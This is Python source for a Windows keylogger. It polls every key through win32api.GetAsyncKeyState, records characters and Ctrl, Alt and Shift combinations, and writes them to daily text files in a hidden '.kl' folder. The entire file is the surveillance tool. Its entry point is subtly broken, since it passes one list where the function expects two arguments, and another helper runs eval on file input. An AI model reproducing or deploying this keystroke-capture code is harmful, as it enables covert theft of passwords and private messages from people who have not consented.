#! python
# -*- coding: utf-8 -*-
"""
Created on Thu Jun 18 21:42:13 2020

@author: 劉又聖
"""

import win32api, time, os, logging

VK_A, VK_Z = 0x41, 0x5A
VK_NUMPAD0, VK_DIVIDE = 0x60, 0x6F

def getKeys():
    keys = ['Reserved'] * 256
    with open("keymap.txt") as infile:
        for line in infile:
            i, k = line.split()
            i = eval(i)
            keys[i] = k
    return keys

def getAlphaKeys():
    """ 左邊的英文字母(大寫) """
    keys = {i : chr(i) for i in range(0x41, 0x5B)}
    return keys

def getNumPlatKeys():
    """ 右手數字盤上的按鍵 """
    keys = { i : chr(i-48) for i in range(96, 106) }
    
    keys[0x6A] = '*'
    keys[0x6B] = '+'
    #keys[0x6C] = ''
    keys[0x6D] = '-'
    keys[0x6E] = '.'
    keys[0x6F] = '/'
    return keys

def getNumKeys():
    """ 左邊上方的數字鍵 """
    keys = {i : chr(i) for i in range(48, 58)}
    # TODO ~-=
    return keys

def getAllKeys():
    result = {**getAlphaKeys(), **getNumPlatKeys(), **getNumKeys()}
    result[0x0D] = '[Enter]'
    result[0x08] = '[Back]'
    result[0x2E] = '[Delete]'
    result[0x09] = '[Tab]'
    result[0xC0] = '~'
    result[0xBD] = '-'
    result[0xBB] = '='
    result[0xBC] = ','
    result[0xBE] = '.'
    result[0xBF] = '?' # / ?
    result[0xDC] = '|' # \ |
    result[0xDB] = '{'
    result[0xDD] = '}'
    result[0xBA] = ';'
    result[0xDE] = '"'
    result[0x20] = ' '
    
    return result    

def pressCapsLock():
    VK_CAPITAL = 0x14
    
    status = win32api.GetKeyState(VK_CAPITAL)
    CapsLock = status & 1 # 取出最後一個bit

    return True if CapsLock else False

def pressNumLock():
    VK_NUMLOCK = 0x90
    
    status = win32api.GetKeyState(VK_NUMLOCK)
    NumLock = status & 1
    
    return True if NumLock else False

def pressCASkey(key_name):
    """
    CAS key means:
        C -> Control
        A -> Alt
        S -> Shift
    """
    VK_SHIFT   = 0x10
    VK_CONTROL = 0x11
    VK_MENU    = 0x12
    
    ck_key = {'Ctrl' : VK_CONTROL, 'Alt' : VK_MENU, 'Shift' : VK_SHIFT}
    status = win32api.GetKeyState(ck_key[key_name])
    return True if status < 0 else False
    
def keylogger(save_dir, isEndFlag):
    try:
        keys = getAllKeys()
        result = ''
        # Make the keylogger dirs
        save_dir = os.path.join(save_dir, '.kl')
        if not os.path.exists(save_dir):
            os.makedirs(save_dir)
        
        while True:
            if isEndFlag.is_set():  # 該結束了
                break
            name = ''
            for code in [3] + list(range(8, 256)):
                status = win32api.GetAsyncKeyState(code)
                if status & 1 == 0:  # 檢查該按鍵是否被按過
                    continue
                if keys.get(code) is None:  # 忽略沒收錄的key
                    continue
                    
                NumLock  = pressNumLock()
                CapsLock = pressCapsLock()
                ShiftKey = pressCASkey('Shift')
                CtrlKey  = pressCASkey('Ctrl')
                AltKey   = pressCASkey('Alt')
                
                modifier = []
                if ShiftKey: modifier.append('Shift')
                if CtrlKey : modifier.append('Ctrl')
                if AltKey  : modifier.append('Alt')

                charactor = keys.get(code)
                name = charactor
                if VK_A <= code <= VK_Z and not modifier and not CapsLock:
                    name = charactor.lower()
                if VK_NUMPAD0 <= code <= VK_DIVIDE and NumLock:
                    name = charactor
                if modifier:
                    modifier.append(charactor)
                    name = '[' + '+'.join(modifier) + ']'
                result += name
                
                # Save file
                if result:
                    fn = 'K' + time.strftime('%Y%m%d') + '.txt'
                    try:
                        fullpath = os.path.join(save_dir, fn)
                        with open(fullpath, 'a') as fd:
                            fd.write(result)
                        result = ''
                    except:
                        logging.debug("Can't open {}".format(fullpath))
                        continue
                result = ''
                time.sleep(0.01)
    except KeyboardInterrupt:
        logging.debug('catch Ctrl+C in {}'.format(__name__))
    except Exception as e:
        logging.error('Error: {}'.format(e.args))
    
    logging.info('Keylogger out')
    return None

if __name__ == '__main__':
    # DEBUG use
    """
    keys = getKeys()
    while True:
        for code in [3] + list(range(8, 256)):
            status = win32api.GetAsyncKeyState(code)
            if status & 1 == 0:
                continue
            print(keys[code])
    """
    keylogger(['D:\\Tmp\\SaveFiles\\127.0.0.1\\logger'])